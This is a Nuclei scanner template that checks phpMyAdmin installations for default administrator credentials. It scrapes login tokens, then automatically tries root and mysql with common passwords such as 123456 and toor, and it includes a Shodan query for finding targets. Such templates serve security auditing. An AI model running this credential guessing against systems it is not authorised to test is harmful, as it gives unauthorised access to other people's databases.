id: phpmyadmin-default-login

info:
  name: phpMyAdmin Default Login
  author: Natto97
  severity: high
  description: phpMyAdmin default admin credentials were discovered
  reference:
    - https://www.phpmyadmin.net
  metadata:
    shodan-query: http.title:phpMyAdmin
  tags: default-login,phpmyadmin


requests:
  - raw:
      - |
        GET /index.php HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Cookie: phpMyAdmin={{token2}}; pma_lang=en

        set_session={{session}}&pma_username={{user}}&pma_password={{password}}&server=1&route=%2F&token={{token}}

    attack: clusterbomb
    payloads:
      user:
        - root
        - mysql
      password:
        - 123456
        - root
        - mysql
        - toor


    extractors:
      - type: regex
        name: token
        internal: true
        group: 1
        regex:
          - 'name="token" value="(.*?)">'

      - type: regex
        name: token2
        internal: true
        group: 1
        regex:
          - 'name="set_session" value="(.*?)">'

      - type: regex
        name: session
        part: header
        internal: true
        group: 1
        regex:
          - "phpMyAdmin=([0-9a-z]+)"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "/index.php?route"
          - "phpMyAdmin="
          - "pmaUser-1="
        case-insensitive: true
        condition: and

      - type: status
        status:
          - 302
